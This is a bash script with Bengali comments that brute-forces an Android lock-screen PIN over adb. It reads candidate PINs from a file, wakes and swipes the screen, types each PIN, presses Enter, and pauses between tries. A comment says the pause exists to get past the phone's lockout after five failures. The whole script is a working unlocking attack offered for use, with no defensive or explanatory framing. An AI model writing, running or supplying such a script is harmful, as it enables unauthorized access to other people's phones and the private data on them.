#!/bin/bash

# ফাইল নাম যেখানে পিনগুলো আছে
PIN_FILE="pins.txt"

# স্ক্রিপ্ট শুরু করার আগে ফোন কানেকশন চেক
echo "[*] Checking for connected devices..."
adb devices

# লুপ শুরু
while read -r pin; do
    echo "[!] Testing PIN: $pin"

    # ১. স্ক্রিন অন করা (যদি অফ থাকে)
    adb shell input keyevent 26
    sleep 1

    # ২. লক স্ক্রিন সোয়াইপ করে উপরে তোলা (Coordinates: x1 y1 x2 y2)
    # আপনার ফোনের রেজোলিউশন অনুযায়ী এটি পরিবর্তন করতে হতে পারে
    adb shell input touchscreen swipe 500 1500 500 500
    sleep 1

    # ৩. PIN ইনপুট দেওয়া
    adb shell input text "$pin"
    sleep 1

    # ৪. Enter বা OK বাটন প্রেস করা
    adb shell input keyevent 66

    # ৫. ফোনের ব্লকিং টাইম এড়ানোর জন্য বিরতি
    # ৫ বার ভুলের পর ফোন লক হয়ে গেলে এখানে সময় বাড়াতে হবে
    echo "[*] Waiting for 5 seconds..."
    sleep 5

done < "$PIN_FILE"

echo "[+] Process completed."
